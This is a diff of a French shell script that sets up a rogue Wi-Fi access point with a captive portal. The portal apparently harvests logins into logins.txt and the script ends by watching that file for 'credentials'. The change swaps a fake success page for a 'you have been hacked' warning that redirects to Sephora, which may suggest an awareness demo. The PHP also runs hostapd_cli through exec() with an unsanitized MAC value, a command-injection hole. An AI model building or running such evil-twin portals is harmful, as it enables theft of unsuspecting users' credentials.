@@ -14,7 +14,7 @@ echo "[+] Création de l'Access Point..."
 echo "[+] Configuration de $WIFI_IFACE avec IP statique."
 ip link set $WIFI_IFACE up
 ip addr flush dev $WIFI_IFACE
-ip addr add $WIFI_IP/24 dev $WIFI_IFACE  # Keeping /24 for simplicity
+ip addr add $WIFI_IP/24 dev $WIFI_IFACE
 
 echo "[+] Activation IP forwarding..."
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -121,14 +121,32 @@ if (!empty($mac)) {
 exec("sudo hostapd_cli deauthenticate $mac");
 
 // Afficher un message de confirmation
-echo "<html><head><title>Connexion réussie</title></head><body>";
-echo "<h2>Connexion réussie !</h2>";
-echo "<h2>IP : {$ip}</h2>";
-echo "<h2>MAC : {$mac}</h2>";
-echo "<p>Vous êtes maintenant connecté à Internet.</p>";
-echo "<script>setTimeout(function(){ window.location.href = 'http://sephora.com'; }, 3000);</script>";
-echo "</body></html>";
-
+echo "<!DOCTYPE html>";
+echo "<html lang='fr'>";
+echo "<head>";
+echo "<meta charset='UTF-8'>";
+echo "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+echo "<title>ATTENTION ! Sécurité Compromise</title>";
+echo "<style>";
+echo "body { background-color: black; color: red; font-family: Arial, sans-serif; text-align: center;";
+echo "display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }";
+echo ".container { max-width: 80%; padding: 20px; border: 2px solid red; border-radius: 10px; background-color: rgba(255, 0, 0, 0.1); }";
+echo "h1 { font-size: 3em; }";
+echo "p { font-size: 1.5em; margin-top: 20px; }";
+echo ".redirect { font-size: 1.2em; color: white; margin-top: 30px; }";
+echo "</style>";
+echo "</head>";
+echo "<body>";
+echo "<div class='container'>";
+echo "<h1>⚠ ATTENTION ! ⚠</h1>";
+echo "<p>Vous avez été piratés ! Faites attention aux identifiants que vous entrez sur Internet, cela peut vous porter préjudice.</p>";
+echo "<p class='redirect'>Vous allez être redirigé vers le site de Sephora...</p>";
+echo "</div>";
+echo "<script>";
+echo "setTimeout(function() { window.location.href = 'https://www.sephora.fr/'; }, 5000);";
+echo "</script>";
+echo "</body>";
+echo "</html>";
 exit();
 ?>
 EOF
@@ -221,4 +239,3 @@ echo "[+] L'Access point est enfin pret !"
 
 echo "Debut du snif de Credentials : "
 tail -f /var/www/html/logins.txt
-                                       
